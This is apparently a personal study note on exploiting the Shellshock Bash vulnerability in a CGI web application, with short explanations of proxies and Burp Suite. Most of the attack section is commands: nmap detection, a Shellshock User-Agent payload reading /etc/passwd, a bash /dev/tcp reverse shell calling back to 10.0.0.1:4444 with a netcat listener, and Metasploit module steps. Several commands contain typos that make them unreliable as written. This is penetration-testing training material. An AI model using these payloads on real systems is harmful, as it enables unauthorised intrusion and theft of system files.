# Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)
#### Overview
`Shellshock`\
Is the name given to a family of vulnerabilities in the **Bash shell**
CGI 

Check if Apatch is running
```bash
nmap <IP>
```
Search IP address on browser and notice CGI command is working in the website in developer tool
Check if it's has vulnerabilities\
[--script=http-shellshock](https://github.com/itr-a/eJTP-Learning/blob/f35580191317792f0cee361f7e7910c405182f4d/Tools/Nmap.md#53)
```bash
# Specify link with 'uri'
nmap -sV <IP> --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
```
Select BurpSuit on FoxyProxy
`BurpSuit`
Linux tool
Make sure **Intercept is on** in **Proxy** tab\
-> Click **Forward**\
Inject special characters in HTTP header
Send requests to Repeater
On **Repeater** tab
-Remove user agent information
```bash
# Send this command
User Agent: () {:;}; echo; echo; bin/bash 'c 'cat /etc/passwd'
```

reverseshell
Set up listener port
```bash
# nc -nvlp <'listen port'>
```

```bash
# <'listen port'> -> 'bash -i>&/dev/tcp/<target IP></listening port> 0>&1'
```

Exploit with Metasploit
```bash
service postgresql start && msfonsole
```
```bash
search shellshock
```
-> Use exploit module
```bash
set RHOSTS
set TARGETURI <example: /gettime.cgi>
exploit
```
---
#### 📓 Note
`FoxyProxy`\
What is **Proxy**?\
A proxy server is like a **middleman between you and the internet**.\
Why use Proxy?
|Purpose|Explanation|
|---|---|
|Hide IP|Site sees the proxy's IP instead
|Bypass restrictions|Access content blocked in the region|
|Filter traffic|seful in companies or schools to block certain sites|
|Debug/Intercept|Tools like Burp Suit use proxy capture your browser traffic|


Example
- Want to visit most sites normally
- BUT want all traffic to a website to go through Burp Suit so can analyze requests


Proxy vs VPN
|Term|What is hides|Encryption|
|---|---|---|
|Proxy|Only browser/app traffic|No encryption(unless HTTPS)|
|VPN|All network traffic|usually encrypted|

Plugin that allows to automatically switch between proxies -> click BurpSuit
-> All traffic will be redirected to the BurpSuit

`Burp Suit`\
An intercepting proxy tool that let you analyze, manipulate and reply web traffic.\
Used in **bug bounty**, CTFs and real-world pentesting.\
What you can do with Burp Suite
|Feature|Purpose|
|---|---|
|Proxy| Intercept/modify browser ↔ server traffic|
|Repeater|Manual request editing & replay|
|Intruder|Brute-force/fuzzing|
|Scanner|Auto find vulns|
|Decoder|Encode/decode data|
|Extensions|Add custom scripts/tools|
<br>
<br>

`reverse shell`\
A reverse shell is when the *target system* connects back to *you* and
gives you **remote command-line access**.
```bash
Attacker (YOU: 10.0.0.1)               Victim (10.0.0.22)
┌────────────────────┐                ┌────────────────────────┐
│ nc -lvnp 4444      │ <──── Connect ─┤ bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
│ (listening shell)  │                │  (reverse shell script)│
└────────────────────┘                └────────────────────────┘
```
#39\
```bash
# <'listen port'> -> 'bash -i>&/dev/tcp/<target IP></listening port> 0>&1'
```
|Part|What it means|
|---|---|
|`bash`|Call **Bash Shell**|
|`-i`|Runs it in **interactive mode**<br>You can type commands and get resposes
|`>&`|Redirect **stdout(1)**and **stderr(2)** to a new location
|`/dev/tcp/<IP>/<listening port>`|A **special file** in Bash that lets you open a TCP connection to an IP and port.
|`0>&1`|Redirects **stdin(0)** to the same place as **stdout**<br>-> Everything flows through the same TCP socket
